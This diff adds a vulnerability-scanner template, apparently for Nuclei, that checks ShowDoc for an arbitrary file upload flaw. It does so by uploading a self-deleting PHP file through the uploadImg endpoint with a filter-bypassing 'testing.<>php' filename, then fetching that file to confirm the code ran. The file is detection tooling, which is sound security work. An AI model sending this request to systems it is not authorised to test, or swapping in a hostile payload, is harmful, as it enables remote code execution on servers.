@@ -1,0 +1,52 @@
+id: showdoc-uploadimg-file-upload
+
+info:
+  name: ShowDoc UploadImg Arbitrary File Upload
+  author: ProjectDiscoveryAI
+  severity: high
+  description: |
+    ShowDoc is a document sharing tool for IT teams. This vulnerability allows an attacker to upload arbitrary files, potentially leading to remote code execution.
+  tags: file-upload
+  reference:
+    - https://www.showdoc.cc/
+
+http:
+  - raw:
+      - |
+        POST /index.php?s=/home/page/uploadImg HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: multipart/form-data; boundary=--------------------------921378126371623762173617
+
+        ----------------------------921378126371623762173617
+        Content-Disposition: form-data; name="editormd-image-file"; filename="testing.<>php"
+        Content-Type: text/plain
+
+        <?php echo md5('fjashfk');unlink(__FILE__);?>
+        ----------------------------921378126371623762173617--
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "success"
+    extractors:
+      - type: regex
+        part: body
+        internal: true
+        name: filepath
+        regex:
+          - "(?P<date>\\d{4}-\\d{2}-\\d{2})\\/(?P<file>[a-f0-9]+\\.php)"
+
+  - raw:
+      - |
+        GET /Public/Uploads/{{filepath}} HTTP/1.1
+        Host: {{Hostname}}
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "82a3c654fd25f018d72022dd8a319a72"
